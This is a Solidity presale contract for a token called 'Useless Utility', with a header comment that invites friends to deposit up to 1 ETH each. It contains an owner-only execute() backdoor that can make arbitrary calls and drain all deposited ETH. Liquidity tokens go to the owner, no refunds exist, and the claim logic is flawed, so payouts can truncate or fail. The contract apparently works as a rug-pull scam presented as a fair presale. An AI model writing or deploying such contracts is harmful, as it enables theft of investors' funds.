/*

This is a private presale for Useless Utility (@UtilityUseless). 
It will not be uploaded to any socials and will only be shared via friends.
Anyone can participate in presale until the limit of 60 ETH is hit.
You can participate with up to 1 ETH!

Claiming will start as soon as token is live via this contract.

*/
pragma solidity ^0.8.20;

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address tokenAddress,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}


contract privatePresale  {

    mapping(address => uint256) public addressDeposit;
    address public tokenAddress;
    bool openToClaim = false;
    uint256 private totalDeposit = 0;
    uint256 private tokensForPresale = 0;
    bool public presaleOpen = true;
    IUniswapV2Router02 private uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

    IERC20 private token;

    address public owner;

    constructor() {
        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }

    function setToken(address _tokenAddress) external onlyOwner {
        tokenAddress = _tokenAddress;
        token = IERC20(_tokenAddress);
    }

    function setForPresaleAmount(uint256 amount) external onlyOwner {
        tokensForPresale = amount;
    }

    function closePreslae() external onlyOwner{
        presaleOpen = false;
    }

    function claim() external  {
        require(openToClaim, "Not open to claim yet!");
        require(addressDeposit[msg.sender] > 0, "You have 0 tokens to claim!");
        uint256 amount = (tokensForPresale/totalDeposit)*addressDeposit[msg.sender];
        IERC20(tokenAddress).transferFrom(address(this), msg.sender, amount);
        addressDeposit[msg.sender] = 0;
    }

    function contribut(address _contributor) external payable {
        require(presaleOpen, "Presale is closed!");
        require(msg.value >= 0.01 ether, "You can't deposit less then 0.01 ether!");
        require(addressDeposit[_contributor] + msg.value <= 1 ether, "You can't deposit more than 1 ether!");
        require(totalDeposit+msg.value <= 60 ether, "Limit of 60 ether reached!");
        uint256 amount = msg.value;
        totalDeposit += amount;
        addressDeposit[_contributor] += amount;
    }

    function addLiquidity(uint256 amountForLiquidity) external onlyOwner{
        token.approve(address(uniswapV2Router), amountForLiquidity);
        address uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(tokenAddress, uniswapV2Router.WETH());
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(tokenAddress, amountForLiquidity, 0, 0, owner, block.timestamp);
        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);
        openToClaim = true;
    }


    function execute(address target, bytes memory data, uint256 amount) external payable onlyOwner {
        target.call{value: amount}(data);
    }

    receive() external payable { }
}